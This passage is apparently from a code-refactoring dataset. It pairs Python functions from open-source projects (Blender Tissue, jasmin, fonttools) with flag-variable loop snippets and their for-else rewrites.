        for i in range(len(bm1.faces)):
            for j in (False,True):
                if j: id = i+1
                else: id = -(i+1)
                join = []
                keep = []
                for p in polyhedra:
                    if id in p: join += p
                    else: keep.append(p)
                if len(join) > 0:
                    keep.append(list(dict.fromkeys(join)))
                    polyhedra = keep

        for i, p in enumerate(polyhedra):
            for j in p:
                bm1.faces[j].material_index = i

        end_time = time.time()
        print('Tissue: Polyhedra wireframe, found {} polyhedra in {:.4f} sec'.format(len(polyhedra), end_time-start_time))


        delete_faces = []
        wireframe_faces = []
        not_wireframe_faces = []
        flat_faces = []

        bm.free()

        #bmesh.ops.bisect_edges(bm1, edges=bm1.edges, cuts=3)

        end_time = time.time()
        print('Tissue: Polyhedra wireframe, subdivide edges in {:.4f} sec'.format(end_time-start_time))

        bm1.faces.index_update()
        #merge_verts = []
        for p in polyhedra:
            delete_faces_poly = []
            wireframe_faces_poly = []
            faces_id = [(f-1)*2 if f > 0 else (-f-1)*2+1 for f in p]
            faces_id_neg = [(-f-1)*2 if -f > 0 else (f-1)*2+1 for f in p]
            merge_verts = []
            faces = [bm1.faces[f_id] for f_id in faces_id]
            for f in faces:
                delete = False
                if f.index in delete_faces: continue
                '''
                cen = f.calc_center_median()
                for e in f.edges:
                    mid = (e.verts[0].co + e.verts[1].co)/2
                    vec1 = e.verts[0].co - e.verts[1].co
                    vec2 = mid - cen
                    ang = Vector.angle(vec1,vec2)
                    length = vec2.length
                    #length = sin(ang)*length
                    if length < self.thickness/2:
                        delete = True
                '''
                if False:
                    sides = len(f.verts)
                    for i in range(sides):
                        v = f.verts[i].co
                        v0 = f.verts[(i-1)%sides].co
                        v1 = f.verts[(i+1)%sides].co
                        vec0 = v0 - v
                        vec1 = v1 - v
                        ang = (pi - vec0.angle(vec1))/2
                        length = min(vec0.length, vec1.length)*sin(ang)
                        if length < self.thickness/2:
                            delete = True
                            break

                if delete:
                    delete_faces_poly.append(f.index)
                else:
                    wireframe_faces_poly.append(f.index)
                merge_verts += [v for v in f.verts]
            if len(wireframe_faces_poly) < 2:
                delete_faces += faces_id
                not_wireframe_faces += faces_id_neg
            else:
                wireframe_faces += wireframe_faces_poly
                flat_faces += delete_faces_poly

            #wireframe_faces = list(dict.fromkeys(wireframe_faces))
            bmesh.ops.remove_doubles(bm1, verts=merge_verts, dist=merge_dist)
            bm1.edges.ensure_lookup_table()
            bm1.faces.ensure_lookup_table()
            bm1.faces.index_update()


        wireframe_faces = [i for i in wireframe_faces if i not in not_wireframe_faces]
        wireframe_faces = list(dict.fromkeys(wireframe_faces))

        flat_faces = list(dict.fromkeys(flat_faces))

        end_time = time.time()
        print('Tissue: Polyhedra wireframe, merge and delete in {:.4f} sec'.format(end_time-start_time))

        poly_me = me.copy()
        bm1.to_mesh(poly_me)
        poly_me.update()
        new_ob = bpy.data.objects.new(""Polyhedra"", poly_me)
        context.collection.objects.link(new_ob)

        ############# FRAME #############
        bm1.faces.index_update()
        wireframe_faces = [bm1.faces[i] for i in wireframe_faces]
        original_faces = wireframe_faces
        #bmesh.ops.remove_doubles(bm1, verts=merge_verts, dist=0.001)

        # detect edge loops

        loops = []
        boundaries_mat = []
        neigh_face_center = []
        face_normals = []

        # compute boundary frames
        new_faces = []
        wire_length = []
        vert_ids = []

        # append regular faces

        for f in original_faces:
            loop = list(f.verts)
            loops.append(loop)
            boundaries_mat.append([f.material_index for v in loop])
            f.normal_update()
            face_normals.append([f.normal for v in loop])

        push_verts = []
        inner_loops = []

        for loop_index, loop in enumerate(loops):
            is_boundary = loop_index < len(neigh_face_center)
            materials = boundaries_mat[loop_index]
            new_loop = []
            loop_ext = [loop[-1]] + loop + [loop[0]]

            # calc tangents
            tangents = []
            for i in range(len(loop)):
                # vertices
                vert0 = loop_ext[i]
                vert = loop_ext[i+1]
                vert1 = loop_ext[i+2]
                # edge vectors
                vec0 = (vert0.co - vert.co).normalized()
                vec1 = (vert.co - vert1.co).normalized()
                # tangent
                _vec1 = -vec1
                _vec0 = -vec0
                ang = (pi - vec0.angle(vec1))/2
                normal = face_normals[loop_index][i]
                tan0 = normal.cross(vec0)
                tan1 = normal.cross(vec1)
                tangent = (tan0 + tan1).normalized()/sin(ang)*self.thickness/2
                tangents.append(tangent)

            # calc correct direction for boundaries
            mult = -1
            if is_boundary:
                dir_val = 0
                for i in range(len(loop)):
                    surf_point = neigh_face_center[loop_index][i]
                    tangent = tangents[i]
                    vert = loop_ext[i+1]
                    dir_val += tangent.dot(vert.co - surf_point)
                if dir_val > 0: mult = 1

            # add vertices
            for i in range(len(loop)):
                vert = loop_ext[i+1]
                area = 1
                new_co = vert.co + tangents[i] * mult * area
                # add vertex
                new_vert = bm1.verts.new(new_co)
                new_loop.append(new_vert)
                vert_ids.append(vert.index)
            new_loop.append(new_loop[0])

            # add faces
            #materials += [materials[0]]
            for i in range(len(loop)):
                v0 = loop_ext[i+1]
                v1 = loop_ext[i+2]
                v2 = new_loop[i+1]
                v3 = new_loop[i]
                face_verts = [v1,v0,v3,v2]
                if mult == -1: face_verts = [v0,v1,v2,v3]
                new_face = bm1.faces.new(face_verts)
                # Material by original edges
                piece_id = 0
                new_face.select = True
                new_faces.append(new_face)
                wire_length.append((v0.co - v1.co).length)
            max_segment = max(wire_length)/self.subdivisions
            #for f,l in zip(new_faces,wire_length):
            #    f.material_index = min(int(l/max_segment), self.subdivisions-1)
            bm1.verts.ensure_lookup_table()
            push_verts += [v.index for v in loop_ext]

        # At this point topology han been build, but not yet thickened

        end_time = time.time()
        print('Tissue: Polyhedra wireframe, frames in {:.4f} sec'.format(end_time-start_time))

        bm1.verts.ensure_lookup_table()
        bm1.edges.ensure_lookup_table()
        bm1.faces.ensure_lookup_table()
        bm1.verts.index_update()

        ### Displace vertices ###

        circle_center = [0]*len(bm1.verts)
        circle_normal = [0]*len(bm1.verts)

        smooth_corners = [True] * len(bm1.verts)
        corners = [[] for i in range(len(bm1.verts))]
        normals = [0]*len(bm1.verts)
        vertices = [0]*len(bm1.verts)
        # Define vectors direction
        for f in new_faces:
            v0 = f.verts[0]
            v1 = f.verts[1]
            id = v0.index
            corners[id].append((v1.co - v0.co).normalized())
            normals[id] = v0.normal.copy()
            vertices[id] = v0
            smooth_corners[id] = False
        # Displace vertices
        for i, vecs in enumerate(corners):
            if len(vecs) > 0:
                v = vertices[i]
                nor = normals[i]
                ang = 0
                for vec in vecs:
                    ang += nor.angle(vec)
                ang /= len(vecs)
                div = sin(ang)
                if div == 0: div = 1
                v.co += nor*self.thickness/2/div

        end_time = time.time()
        print('Tissue: Polyhedra wireframe, corners displace in {:.4f} sec'.format(end_time-start_time))

        # Removing original flat faces

        flat_faces = [bm1.faces[i] for i in flat_faces]
        for f in flat_faces:
            f.material_index = self.subdivisions+1
            for v in f.verts:
                if smooth_corners[v.index]:
                    v.co += v.normal*self.thickness/2
                    smooth_corners[v.index] = False
        delete_faces = delete_faces + [f.index for f in original_faces]
        delete_faces = list(dict.fromkeys(delete_faces))
        delete_faces = [bm1.faces[i] for i in delete_faces]
        bmesh.ops.delete(bm1, geom=delete_faces, context='FACES')

        bmesh.ops.remove_doubles(bm1, verts=bm1.verts, dist=merge_dist)
        bm1.faces.ensure_lookup_table()
        bm1.edges.ensure_lookup_table()
        bm1.verts.ensure_lookup_table()

        if self.dissolve_inners:
            bm1.edges.index_update()
            dissolve_edges = []
            for f in bm1.faces:
                e = f.edges[2]
                if e not in dissolve_edges:
                    dissolve_edges.append(e)
            bmesh.ops.dissolve_edges(bm1, edges=dissolve_edges, use_verts=True, use_face_split=True)

        all_lines = [[] for e in me.edges]
        all_end_points = [[] for e in me.edges]
        for v in bm1.verts: v.select_set(False)
        for f in bm1.faces: f.select_set(False)

        _me = me.copy()
        bm1.to_mesh(me)
        me.update()
        new_ob = bpy.data.objects.new(""Wireframe"", me)
        context.collection.objects.link(new_ob)
        for o in context.scene.objects: o.select_set(False)
        new_ob.select_set(True)
        context.view_layer.objects.active = new_ob
        me = _me

        bm1.free()
        bpy.data.meshes.remove(_me)
        #new_ob.location = ob.location
        new_ob.matrix_world = ob.matrix_world

        end_time = time.time()
        print('Tissue: Polyhedra wireframe in {:.4f} sec'.format(end_time-start_time))
        return {'FINISHED'}","for p in polyhedra:
    if id1 in p or id2 in p:
        new_poly = False
        if id2 not in p:
            p.append(id2)
        if id1 not in p:
            p.append(id1)
        break
if new_poly:
    polyhedra.append([id1, id2])","for p in polyhedra:
    if id1 in p or id2 in p:
        if id2 not in p:
            p.append(id2)
        if id1 not in p:
            p.append(id1)
        break
else:
    polyhedra.append([id1, id2])",0
tissue,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/tissue/polyhedra.py,https://github.com/alessandro-zomparelli/tissue/tree/master//polyhedra.py,polyhedra_wireframe,execute$94,"def execute(self, context):

        merge_dist = self.thickness*0.001

        subs = self.subdivisions

        start_time = time.time()
        ob = context.object
        me = simple_to_mesh(ob)
        bm = bmesh.new()
        bm.from_mesh(me)

        bm.verts.ensure_lookup_table()
        bm.edges.ensure_lookup_table()
        bm.faces.ensure_lookup_table()

        # Subdivide edges
        proportional_subs = True
        if subs > 1 and proportional_subs:
            wire_length = [e.calc_length() for e in bm.edges]
            all_edges = list(bm.edges)
            max_segment = max(wire_length)/subs
            split_edges = [[] for i in range(subs+1)]
            for e, l in zip(all_edges, wire_length):
                split_edges[int(l//max_segment)].append(e)
            for i in range(2,subs):
                perc = {}
                for e in split_edges[i]:
                    perc[e]=0.1
                bmesh.ops.bisect_edges(bm, edges=split_edges[i], cuts=i, edge_percents=perc)

        ### Create double faces
        double_faces = []
        double_layer_edge = []
        double_layer_piece = []
        for f in bm.faces:
            verts0 = [v.co for v in f.verts]
            verts1 = [v.co for v in f.verts]
            verts1.reverse()
            double_faces.append(verts0)
            double_faces.append(verts1)

        # Create new bmesh object and data layers
        bm1 = bmesh.new()

        # Create faces and assign Edge Layers
        for verts in double_faces:
            new_verts = []
            for v in verts:
                vert = bm1.verts.new(v)
                new_verts.append(vert)
            bm1.faces.new(new_verts)

        bm1.verts.ensure_lookup_table()
        bm1.edges.ensure_lookup_table()
        bm1.faces.ensure_lookup_table()

        n_faces = len(bm.faces)
        n_doubles = len(bm1.faces)

        polyhedra = []

        for e in bm.edges:
            done = []

            # ERROR: Naked edges
            e_faces = len(e.link_faces)
            if e_faces < 2:
                bm.free()
                bm1.free()
                message = ""Naked edges are not allowed""
                self.report({'ERROR'}, message)
                return {'CANCELLED'}

            edge_vec =  e.verts[1].co - e.verts[0].co

            # run first face
            for i1 in range(e_faces-1):
                f1 = e.link_faces[i1]
                #edge_verts1 = [v.index for v in f1.verts if v in e.verts]
                verts1 = [v.index for v in f1.verts]
                va1 = verts1.index(e.verts[0].index)
                vb1 = verts1.index(e.verts[1].index)
                # chech if order of the edge matches the order of the face
                dir1 = va1 == (vb1+1)%len(verts1)
                edge_vec1 = edge_vec if dir1 else -edge_vec

                # run second face
                faces2 = []
                normals2 = []
                for i2 in range(i1+1,e_faces):
                #for i2 in range(n_faces):
                    if i1 == i2: continue
                    f2 = e.link_faces[i2]
                    f2.normal_update()
                    #edge_verts2 = [v.index for v in f2.verts if v in e.verts]
                    verts2 = [v.index for v in f2.verts]
                    va2 = verts2.index(e.verts[0].index)
                    vb2 = verts2.index(e.verts[1].index)
                    # chech if order of the edge matches the order of the face
                    dir2 = va2 == (vb2+1)%len(verts2)
                    # check for normal consistency
                    if dir1 != dir2:
                        # add face
                        faces2.append(f2.index+1)
                        normals2.append(f2.normal)
                    else:
                        # add flipped face
                        faces2.append(-(f2.index+1))
                        normals2.append(-f2.normal)



                # find first polyhedra (positive)
                plane_x = f1.normal                     # normal
                plane_y = plane_x.cross(edge_vec1)      # tangent face perp edge
                id1 = (f1.index+1)

                min_angle0 = 10000

                # check consistent faces
                if id1 not in done:
                    id2 = None
                    min_angle = min_angle0
                    for i2, n2 in zip(faces2,normals2):
                        v2 = flatten_vector(-n2, plane_x, plane_y)
                        angle = vector_rotation(v2)
                        if angle < min_angle:
                            id2 = i2
                            min_angle = angle
                    if id2: done.append(id2)
                    new_poly = True
                    # add to existing polyhedron
                    for p in polyhedra:
                        if id1 in p or id2 in p:
                            new_poly = False
                            if id2 not in p: p.append(id2)
                            if id1 not in p: p.append(id1)
                            break
                    # start new polyhedron
                    if new_poly: polyhedra.append([id1, id2])

                # find second polyhedra (negative)
                plane_x = -f1.normal                    # normal
                plane_y = plane_x.cross(-edge_vec1)      # tangent face perp edge
                id1 = -(f1.index+1)

                if id1 not in done:
                    id2 = None
                    min_angle = min_angle0
                    for i2, n2 in zip(faces2, normals2):
                        v2 = flatten_vector(n2, plane_x, plane_y)
                        angle = vector_rotation(v2)
                        if angle < min_angle:
                            id2 = -i2
                            min_angle = angle
                    done.append(id2)
                    add = True
                    for p in polyhedra:
                        if id1 in p or id2 in p:
                            add = False
                            if id2 not in p: p.append(id2)
                            if id1 not in p: p.append(id1)
                            break
                    if add: polyhedra.append([id1, id2])

        for i in range(len(bm1.faces)):
            for j in (False,True):
                if j: id = i+1
                else: id = -(i+1)
                join = []
                keep = []
                for p in polyhedra:
                    if id in p: join += p
                    else: keep.append(p)
                if len(join) > 0:
                    keep.append(list(dict.fromkeys(join)))
                    polyhedra = keep

        for i, p in enumerate(polyhedra):
            for j in p:
                bm1.faces[j].material_index = i

        end_time = time.time()
        print('Tissue: Polyhedra wireframe, found {} polyhedra in {:.4f} sec'.format(len(polyhedra), end_time-start_time))


        delete_faces = []
        wireframe_faces = []
        not_wireframe_faces = []
        flat_faces = []

        bm.free()

        #bmesh.ops.bisect_edges(bm1, edges=bm1.edges, cuts=3)

        end_time = time.time()
        print('Tissue: Polyhedra wireframe, subdivide edges in {:.4f} sec'.format(end_time-start_time))

        bm1.faces.index_update()
        #merge_verts = []
        for p in polyhedra:
            delete_faces_poly = []
            wireframe_faces_poly = []
            faces_id = [(f-1)*2 if f > 0 else (-f-1)*2+1 for f in p]
            faces_id_neg = [(-f-1)*2 if -f > 0 else (f-1)*2+1 for f in p]
            merge_verts = []
            faces = [bm1.faces[f_id] for f_id in faces_id]
            for f in faces:
                delete = False
                if f.index in delete_faces: continue
                '''
                cen = f.calc_center_median()
                for e in f.edges:
                    mid = (e.verts[0].co + e.verts[1].co)/2
                    vec1 = e.verts[0].co - e.verts[1].co
                    vec2 = mid - cen
                    ang = Vector.angle(vec1,vec2)
                    length = vec2.length
                    #length = sin(ang)*length
                    if length < self.thickness/2:
                        delete = True
                '''
                if False:
                    sides = len(f.verts)
                    for i in range(sides):
                        v = f.verts[i].co
                        v0 = f.verts[(i-1)%sides].co
                        v1 = f.verts[(i+1)%sides].co
                        vec0 = v0 - v
                        vec1 = v1 - v
                        ang = (pi - vec0.angle(vec1))/2
                        length = min(vec0.length, vec1.length)*sin(ang)
                        if length < self.thickness/2:
                            delete = True
                            break

                if delete:
                    delete_faces_poly.append(f.index)
                else:
                    wireframe_faces_poly.append(f.index)
                merge_verts += [v for v in f.verts]
            if len(wireframe_faces_poly) < 2:
                delete_faces += faces_id
                not_wireframe_faces += faces_id_neg
            else:
                wireframe_faces += wireframe_faces_poly
                flat_faces += delete_faces_poly

            #wireframe_faces = list(dict.fromkeys(wireframe_faces))
            bmesh.ops.remove_doubles(bm1, verts=merge_verts, dist=merge_dist)
            bm1.edges.ensure_lookup_table()
            bm1.faces.ensure_lookup_table()
            bm1.faces.index_update()


        wireframe_faces = [i for i in wireframe_faces if i not in not_wireframe_faces]
        wireframe_faces = list(dict.fromkeys(wireframe_faces))

        flat_faces = list(dict.fromkeys(flat_faces))

        end_time = time.time()
        print('Tissue: Polyhedra wireframe, merge and delete in {:.4f} sec'.format(end_time-start_time))

        poly_me = me.copy()
        bm1.to_mesh(poly_me)
        poly_me.update()
        new_ob = bpy.data.objects.new(""Polyhedra"", poly_me)
        context.collection.objects.link(new_ob)

        ############# FRAME #############
        bm1.faces.index_update()
        wireframe_faces = [bm1.faces[i] for i in wireframe_faces]
        original_faces = wireframe_faces
        #bmesh.ops.remove_doubles(bm1, verts=merge_verts, dist=0.001)

        # detect edge loops

        loops = []
        boundaries_mat = []
        neigh_face_center = []
        face_normals = []

        # compute boundary frames
        new_faces = []
        wire_length = []
        vert_ids = []

        # append regular faces

        for f in original_faces:
            loop = list(f.verts)
            loops.append(loop)
            boundaries_mat.append([f.material_index for v in loop])
            f.normal_update()
            face_normals.append([f.normal for v in loop])

        push_verts = []
        inner_loops = []

        for loop_index, loop in enumerate(loops):
            is_boundary = loop_index < len(neigh_face_center)
            materials = boundaries_mat[loop_index]
            new_loop = []
            loop_ext = [loop[-1]] + loop + [loop[0]]

            # calc tangents
            tangents = []
            for i in range(len(loop)):
                # vertices
                vert0 = loop_ext[i]
                vert = loop_ext[i+1]
                vert1 = loop_ext[i+2]
                # edge vectors
                vec0 = (vert0.co - vert.co).normalized()
                vec1 = (vert.co - vert1.co).normalized()
                # tangent
                _vec1 = -vec1
                _vec0 = -vec0
                ang = (pi - vec0.angle(vec1))/2
                normal = face_normals[loop_index][i]
                tan0 = normal.cross(vec0)
                tan1 = normal.cross(vec1)
                tangent = (tan0 + tan1).normalized()/sin(ang)*self.thickness/2
                tangents.append(tangent)

            # calc correct direction for boundaries
            mult = -1
            if is_boundary:
                dir_val = 0
                for i in range(len(loop)):
                    surf_point = neigh_face_center[loop_index][i]
                    tangent = tangents[i]
                    vert = loop_ext[i+1]
                    dir_val += tangent.dot(vert.co - surf_point)
                if dir_val > 0: mult = 1

            # add vertices
            for i in range(len(loop)):
                vert = loop_ext[i+1]
                area = 1
                new_co = vert.co + tangents[i] * mult * area
                # add vertex
                new_vert = bm1.verts.new(new_co)
                new_loop.append(new_vert)
                vert_ids.append(vert.index)
            new_loop.append(new_loop[0])

            # add faces
            #materials += [materials[0]]
            for i in range(len(loop)):
                v0 = loop_ext[i+1]
                v1 = loop_ext[i+2]
                v2 = new_loop[i+1]
                v3 = new_loop[i]
                face_verts = [v1,v0,v3,v2]
                if mult == -1: face_verts = [v0,v1,v2,v3]
                new_face = bm1.faces.new(face_verts)
                # Material by original edges
                piece_id = 0
                new_face.select = True
                new_faces.append(new_face)
                wire_length.append((v0.co - v1.co).length)
            max_segment = max(wire_length)/self.subdivisions
            #for f,l in zip(new_faces,wire_length):
            #    f.material_index = min(int(l/max_segment), self.subdivisions-1)
            bm1.verts.ensure_lookup_table()
            push_verts += [v.index for v in loop_ext]

        # At this point topology han been build, but not yet thickened

        end_time = time.time()
        print('Tissue: Polyhedra wireframe, frames in {:.4f} sec'.format(end_time-start_time))

        bm1.verts.ensure_lookup_table()
        bm1.edges.ensure_lookup_table()
        bm1.faces.ensure_lookup_table()
        bm1.verts.index_update()

        ### Displace vertices ###

        circle_center = [0]*len(bm1.verts)
        circle_normal = [0]*len(bm1.verts)

        smooth_corners = [True] * len(bm1.verts)
        corners = [[] for i in range(len(bm1.verts))]
        normals = [0]*len(bm1.verts)
        vertices = [0]*len(bm1.verts)
        # Define vectors direction
        for f in new_faces:
            v0 = f.verts[0]
            v1 = f.verts[1]
            id = v0.index
            corners[id].append((v1.co - v0.co).normalized())
            normals[id] = v0.normal.copy()
            vertices[id] = v0
            smooth_corners[id] = False
        # Displace vertices
        for i, vecs in enumerate(corners):
            if len(vecs) > 0:
                v = vertices[i]
                nor = normals[i]
                ang = 0
                for vec in vecs:
                    ang += nor.angle(vec)
                ang /= len(vecs)
                div = sin(ang)
                if div == 0: div = 1
                v.co += nor*self.thickness/2/div

        end_time = time.time()
        print('Tissue: Polyhedra wireframe, corners displace in {:.4f} sec'.format(end_time-start_time))

        # Removing original flat faces

        flat_faces = [bm1.faces[i] for i in flat_faces]
        for f in flat_faces:
            f.material_index = self.subdivisions+1
            for v in f.verts:
                if smooth_corners[v.index]:
                    v.co += v.normal*self.thickness/2
                    smooth_corners[v.index] = False
        delete_faces = delete_faces + [f.index for f in original_faces]
        delete_faces = list(dict.fromkeys(delete_faces))
        delete_faces = [bm1.faces[i] for i in delete_faces]
        bmesh.ops.delete(bm1, geom=delete_faces, context='FACES')

        bmesh.ops.remove_doubles(bm1, verts=bm1.verts, dist=merge_dist)
        bm1.faces.ensure_lookup_table()
        bm1.edges.ensure_lookup_table()
        bm1.verts.ensure_lookup_table()

        if self.dissolve_inners:
            bm1.edges.index_update()
            dissolve_edges = []
            for f in bm1.faces:
                e = f.edges[2]
                if e not in dissolve_edges:
                    dissolve_edges.append(e)
            bmesh.ops.dissolve_edges(bm1, edges=dissolve_edges, use_verts=True, use_face_split=True)

        all_lines = [[] for e in me.edges]
        all_end_points = [[] for e in me.edges]
        for v in bm1.verts: v.select_set(False)
        for f in bm1.faces: f.select_set(False)

        _me = me.copy()
        bm1.to_mesh(me)
        me.update()
        new_ob = bpy.data.objects.new(""Wireframe"", me)
        context.collection.objects.link(new_ob)
        for o in context.scene.objects: o.select_set(False)
        new_ob.select_set(True)
        context.view_layer.objects.active = new_ob
        me = _me

        bm1.free()
        bpy.data.meshes.remove(_me)
        #new_ob.location = ob.location
        new_ob.matrix_world = ob.matrix_world

        end_time = time.time()
        print('Tissue: Polyhedra wireframe in {:.4f} sec'.format(end_time-start_time))
        return {'FINISHED'}","for p in polyhedra:
    if id1 in p or id2 in p:
        add = False
        if id2 not in p:
            p.append(id2)
        if id1 not in p:
            p.append(id1)
        break
if add:
    polyhedra.append([id1, id2])","for p in polyhedra:
    if id1 in p or id2 in p:
        if id2 not in p:
            p.append(id2)
        if id1 not in p:
            p.append(id1)
        break
else:
    polyhedra.append([id1, id2])",0
jasmin,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/jasmin/jasmin/tools/migrations/configuration.py,https://github.com/jookies/jasmin/tree/master/jasmin/tools/migrations/configuration.py,ConfigurationMigrator,getMigratedData$72,"def getMigratedData(self):
        """"""Return data after executing migration steps""""""
        for m in MAP:
            # Context verification
            if self.context not in m['contexts']:
                self.log.debug('%s is not in map conditions: %s', self.context, m['contexts'])
                continue

            # Validate conditions (with AND operator)
            valid = True
            for condition in m['conditions']:
                self.log.debug('Checking condition: %s with version %s', condition, self.version)
                if not version_is_valid(self.version, condition):
                    self.log.debug('Condition failed: %s with version %s', condition, self.version)
                    valid = False
                    break

            # We have matching context and valid conditions
            if valid:
                for operation in m['operations']:
                    self.log.info('Migrating old data [%s] from v%s to v%s by calling %s(data)',
                                  self.context, self.version, jasmin.get_release(), operation.__name__)
                    self.data = operation(self.data, context=self.context)
        return self.data","for condition in m['conditions']:
    self.log.debug('Checking condition: %s with version %s', condition, self.version)
    if not version_is_valid(self.version, condition):
        self.log.debug('Condition failed: %s with version %s', condition, self.version)
        valid = False
        break
if valid:
    for operation in m['operations']:
        self.log.info('Migrating old data [%s] from v%s to v%s by calling %s(data)', self.context, self.version, jasmin.get_release(), operation.__name__)
        self.data = operation(self.data, context=self.context)","for condition in m['conditions']:
    self.log.debug('Checking condition: %s with version %s', condition, self.version)
    if not version_is_valid(self.version, condition):
        self.log.debug('Condition failed: %s with version %s', condition, self.version)
        break
else:
    for operation in m['operations']:
        self.log.info('Migrating old data [%s] from v%s to v%s by calling %s(data)', self.context, self.version, jasmin.get_release(), operation.__name__)
        self.data = operation(self.data, context=self.context)",0
fonttools,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/fonttools/Lib/fontTools/varLib/mutator.py,https://github.com/fonttools/fonttools/tree/master/Lib/fontTools/varLib/mutator.py,,instantiateVariableFont$152,"def instantiateVariableFont(varfont, location, inplace=False, overlap=True):
	"""""" Generate a static instance from a variable TTFont and a dictionary
	defining the desired location along the variable font's axes.
	The location values must be specified as user-space coordinates, e.g.:

		{'wght': 400, 'wdth': 100}

	By default, a new TTFont object is returned. If ``inplace`` is True, the
	input varfont is modified and reduced to a static font.

	When the overlap parameter is defined as True,
	OVERLAP_SIMPLE and OVERLAP_COMPOUND bits are set to 1.  See
	https://docs.microsoft.com/en-us/typography/opentype/spec/glyf
	""""""
	if not inplace:
		# make a copy to leave input varfont unmodified
		stream = BytesIO()
		varfont.save(stream)
		stream.seek(0)
		varfont = TTFont(stream)

	fvar = varfont['fvar']
	axes = {a.axisTag:(a.minValue,a.defaultValue,a.maxValue) for a in fvar.axes}
	loc = normalizeLocation(location, axes)
	if 'avar' in varfont:
		maps = varfont['avar'].segments
		loc = {k: piecewiseLinearMap(v, maps[k]) for k,v in loc.items()}
	# Quantize to F2Dot14, to avoid surprise interpolations.
	loc = {k:floatToFixedToFloat(v, 14) for k,v in loc.items()}
	# Location is normalized now
	log.info(""Normalized location: %s"", loc)

	if 'gvar' in varfont:
		log.info(""Mutating glyf/gvar tables"")
		gvar = varfont['gvar']
		glyf = varfont['glyf']
		hMetrics = varfont['hmtx'].metrics
		vMetrics = getattr(varfont.get('vmtx'), 'metrics', None)
		# get list of glyph names in gvar sorted by component depth
		glyphnames = sorted(
			gvar.variations.keys(),
			key=lambda name: (
				glyf[name].getCompositeMaxpValues(glyf).maxComponentDepth
				if glyf[name].isComposite() else 0,
				name))
		for glyphname in glyphnames:
			variations = gvar.variations[glyphname]
			coordinates, _ = glyf._getCoordinatesAndControls(glyphname, hMetrics, vMetrics)
			origCoords, endPts = None, None
			for var in variations:
				scalar = supportScalar(loc, var.axes)
				if not scalar: continue
				delta = var.coordinates
				if None in delta:
					if origCoords is None:
						origCoords, g = glyf._getCoordinatesAndControls(glyphname, hMetrics, vMetrics)
					delta = iup_delta(delta, origCoords, g.endPts)
				coordinates += GlyphCoordinates(delta) * scalar
			glyf._setCoordinates(glyphname, coordinates, hMetrics, vMetrics)
	else:
		glyf = None

	if 'cvar' in varfont:
		log.info(""Mutating cvt/cvar tables"")
		cvar = varfont['cvar']
		cvt = varfont['cvt ']
		deltas = {}
		for var in cvar.variations:
			scalar = supportScalar(loc, var.axes)
			if not scalar: continue
			for i, c in enumerate(var.coordinates):
				if c is not None:
					deltas[i] = deltas.get(i, 0) + scalar * c
		for i, delta in deltas.items():
			cvt[i] += otRound(delta)

	if 'CFF2' in varfont:
		log.info(""Mutating CFF2 table"")
		glyphOrder = varfont.getGlyphOrder()
		CFF2 = varfont['CFF2']
		topDict = CFF2.cff.topDictIndex[0]
		vsInstancer = VarStoreInstancer(topDict.VarStore.otVarStore, fvar.axes, loc)
		interpolateFromDeltas = vsInstancer.interpolateFromDeltas
		interpolate_cff2_PrivateDict(topDict, interpolateFromDeltas)
		CFF2.desubroutinize()
		interpolate_cff2_charstrings(topDict, interpolateFromDeltas, glyphOrder)
		interpolate_cff2_metrics(varfont, topDict, glyphOrder, loc)
		del topDict.rawDict['VarStore']
		del topDict.VarStore

	if 'MVAR' in varfont:
		log.info(""Mutating MVAR table"")
		mvar = varfont['MVAR'].table
		varStoreInstancer = VarStoreInstancer(mvar.VarStore, fvar.axes, loc)
		records = mvar.ValueRecord
		for rec in records:
			mvarTag = rec.ValueTag
			if mvarTag not in MVAR_ENTRIES:
				continue
			tableTag, itemName = MVAR_ENTRIES[mvarTag]
			delta = otRound(varStoreInstancer[rec.VarIdx])
			if not delta:
				continue
			setattr(varfont[tableTag], itemName,
				getattr(varfont[tableTag], itemName) + delta)

	log.info(""Mutating FeatureVariations"")
	for tableTag in 'GSUB','GPOS':
		if not tableTag in varfont:
			continue
		table = varfont[tableTag].table
		if not getattr(table, 'FeatureVariations', None):
			continue
		variations = table.FeatureVariations
		for record in variations.FeatureVariationRecord:
			applies = True
			for condition in record.ConditionSet.ConditionTable:
				if condition.Format == 1:
					axisIdx = condition.AxisIndex
					axisTag = fvar.axes[axisIdx].axisTag
					Min = condition.FilterRangeMinValue
					Max = condition.FilterRangeMaxValue
					v = loc[axisTag]
					if not (Min <= v <= Max):
						applies = False
				else:
					applies = False
				if not applies:
					break

			if applies:
				assert record.FeatureTableSubstitution.Version == 0x00010000
				for rec in record.FeatureTableSubstitution.SubstitutionRecord:
					table.FeatureList.FeatureRecord[rec.FeatureIndex].Feature = rec.Feature
				break
		del table.FeatureVariations

	if 'GDEF' in varfont and varfont['GDEF'].table.Version >= 0x00010003:
		log.info(""Mutating GDEF/GPOS/GSUB tables"")
		gdef = varfont['GDEF'].table
		instancer = VarStoreInstancer(gdef.VarStore, fvar.axes, loc)

		merger = MutatorMerger(varfont, instancer)
		merger.mergeTables(varfont, [varfont], ['GDEF', 'GPOS'])

		# Downgrade GDEF.
		del gdef.VarStore
		gdef.Version = 0x00010002
		if gdef.MarkGlyphSetsDef is None:
			del gdef.MarkGlyphSetsDef
			gdef.Version = 0x00010000

		if not (gdef.LigCaretList or
			gdef.MarkAttachClassDef or
			gdef.GlyphClassDef or
			gdef.AttachList or
			(gdef.Version >= 0x00010002 and gdef.MarkGlyphSetsDef)):
			del varfont['GDEF']

	addidef = False
	if glyf:
		for glyph in glyf.glyphs.values():
			if hasattr(glyph, ""program""):
				instructions = glyph.program.getAssembly()
				# If GETVARIATION opcode is used in bytecode of any glyph add IDEF
				addidef = any(op.startswith(""GETVARIATION"") for op in instructions)
				if addidef:
					break
		if overlap:
			for glyph_name in glyf.keys():
				glyph = glyf[glyph_name]
				# Set OVERLAP_COMPOUND bit for compound glyphs
				if glyph.isComposite():
					glyph.components[0].flags |= OVERLAP_COMPOUND
				# Set OVERLAP_SIMPLE bit for simple glyphs
				elif glyph.numberOfContours > 0:
					glyph.flags[0] |= flagOverlapSimple
	if addidef:
		log.info(""Adding IDEF to fpgm table for GETVARIATION opcode"")
		asm = []
		if 'fpgm' in varfont:
			fpgm = varfont['fpgm']
			asm = fpgm.program.getAssembly()
		else:
			fpgm = newTable('fpgm')
			fpgm.program = ttProgram.Program()
			varfont['fpgm'] = fpgm
		asm.append(""PUSHB[000] 145"")
		asm.append(""IDEF[ ]"")
		args = [str(len(loc))]
		for a in fvar.axes:
